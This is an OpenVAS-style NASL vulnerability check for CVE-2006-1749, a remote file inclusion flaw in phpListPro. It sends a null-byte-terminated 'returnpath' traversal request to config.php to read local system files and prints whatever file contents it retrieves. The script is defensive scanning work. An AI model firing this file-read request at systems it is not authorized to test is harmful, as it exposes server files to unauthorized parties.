# SPDX-FileCopyrightText: 2008 Josh Zlatin-Amishav
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.80077");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2006-1749");
  script_xref(name:"OSVDB", value:"24540");
  script_name("phpListPro returnpath Remote File Include Vulnerabilities");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2008 Josh Zlatin-Amishav");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "os_detection.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"The remote web server is running phpListPro which is affected by
  remote file include vulnerabilities.");

  script_tag(name:"insight", value:"The installed version of phpListPro fails to sanitize user input to
  the 'returnpath' parameter of the 'config.php', 'editsite.php', 'addsite.php', and 'in.php' scripts
  before using it to include PHP code from other files.

  These flaws are only exploitable if PHP's 'register_globals' is enabled.");

  script_tag(name:"impact", value:"An unauthenticated attacker may be able to read arbitrary local files
  or include a file from a remote host that contains commands which will be executed on the remote host
  subject to the privileges of the web server process.");

  script_tag(name:"solution_type", value:"Mitigation");

  script_tag(name:"solution", value:"Edit the affected files as discussed in the referenced vendor advisory.");

  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-04/0206.html");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/17448");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0153.html");
  script_xref(name:"URL", value:"http://archives.neohapsis.com/archives/bugtraq/2006-05/0199.html");
  script_xref(name:"URL", value:"http://www.smartisoft.com/forum/viewtopic.php?t=3019");

  exit(0);
}

include("host_details.inc");
include("os_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");
include("misc_func.inc");
include("traversal_func.inc");

port = http_get_port(default:80);
if (!http_can_host_php(port:port))
  exit(0);

# Google for '"PHPListPro Ver"|intitle:"rated TopList"'.
foreach dir(make_list_unique("/phplistpro", "/toplist", "/topsite", http_cgi_dirs(port:port))) {

  if(dir == "/") dir = "";
  buf = http_get_cache( item: dir + "/", port:port );
  if(!buf || ("PHPListPro Ver" >!< buf && "rated TopList" >!< buf))
    continue;

  files = traversal_files();

  foreach pattern(keys(files)) {

    file = "/" + files[pattern];

    req = http_get( item:string(dir, "/config.php?returnpath=" + file + "%00" ), port:port );
    res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
    if (!res)
      continue;

    # There's a problem if...
    if (
        # there's an entry for root or...
        egrep(pattern:pattern, string:res) ||
        # we get an error saying "Failed opening".
        egrep(string:res, pattern:"Failed opening required '" + file + "\\0lang_.+")
    ) {
      if (egrep(pattern:pattern, string:res)) content = res;

      if (content)
        report = string(
          "Here are the repeated contents of the file '" + file + "' that\n",
          " the scanner was able to read from the remote host :\n",
          "\n",
          content
        );

      security_message(port:port, data:report);
      exit(0);
    }
  }
}

exit( 99 );
